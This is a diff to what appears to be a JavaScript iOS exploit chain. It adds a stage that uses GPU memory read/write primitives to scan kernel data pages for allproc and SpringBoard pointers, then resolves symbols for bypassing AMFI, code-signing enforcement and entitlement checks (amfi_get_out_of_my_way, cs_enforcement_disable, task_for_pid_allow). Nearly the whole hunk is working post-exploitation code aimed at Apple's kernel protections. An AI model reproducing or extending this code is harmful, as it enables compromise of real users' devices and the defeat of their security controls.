@@ -7168,6 +7168,46 @@
       LOG("[M5] Cannot test — target value is FFs or 0, trying different offset");
     }
 
+    // ===== M5: Use GPU r/w to find allproc and SpringBoard =====
+    LOG("[M5] GPU r/w confirmed. Searching for allproc on data page...");
+    let data_page = (pn_addr + 0x40n + 0x19cefn * 4096n) & ~0xFFFn;
+    LOG(`[M5] Data page: ${data_page.hex()} pn_addr=${pn_addr.hex()}`);
+
+    // Quick verification: read a few known offsets
+    for (let off of [0x000n, 0x710n, 0x8c0n, 0xcf8n, 0xdf8n, 0xe38n, 0xe88n, 0xfe0n]) {
+      let v = 0n;
+      try { v = uread64(data_page + off); } catch(e) {}
+      LOG(`[M5] page+0x${off.toString(16)}: ${v.hex()}`);
+    }
+
+    // Quick scan for KC pointers on data page (just log the top ones)
+    let kc_ptrs = [];
+    for (let off = 0n; off < 0x200n; off += 8n) { // first 512 bytes only
+      let v = 0n;
+      try { v = uread64(data_page + off); } catch(e) {}
+      if (v > 0x100000000n && v < 0x300000000n) {
+        kc_ptrs.push({off, addr: v});
+      }
+    }
+    LOG(`[M5] Found ${kc_ptrs.length} KC-range pointers (first 512 bytes)`);
+    for (let p of kc_ptrs.slice(0, 8)) {
+      LOG(`[M5]   +${p.off.toString(16).padStart(4,'0')}: ${p.addr.hex()}`);
+    }
+
+    // ===== Try AMFI bypass via gpuDlsym =====
+    LOG("[M5] Looking for AMFI/entitlement bypass symbols...");
+    let amfi_names = ["amfi_flags", "_amfi_flags", "amfi_get_out_of_my_way",
+                      "cs_debug", "_cs_debug", "cs_enforcement_disable",
+                      "AMFI_get_out_of_my_way", "mac_cred_label_update",
+                      "task_for_pid_allow", "entitlement_check",
+                      "IOTaskHasEntitlement", "task_has_entitlement"];
+    for (let name of amfi_names) {
+      let sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, name);
+      if (sym != 0n && sym.noPAC() != 0n) {
+        LOG(`[M5] gpuDlsym("${name}") = ${sym.hex()}`);
+      }
+    }
+
     // ===== M5: Kernel Read/Write via ICMPv6 socket (mpd_fcall) =====
     // Step 1: Diagnose socket availability in MPD
     const AF_INET6 = 30n;
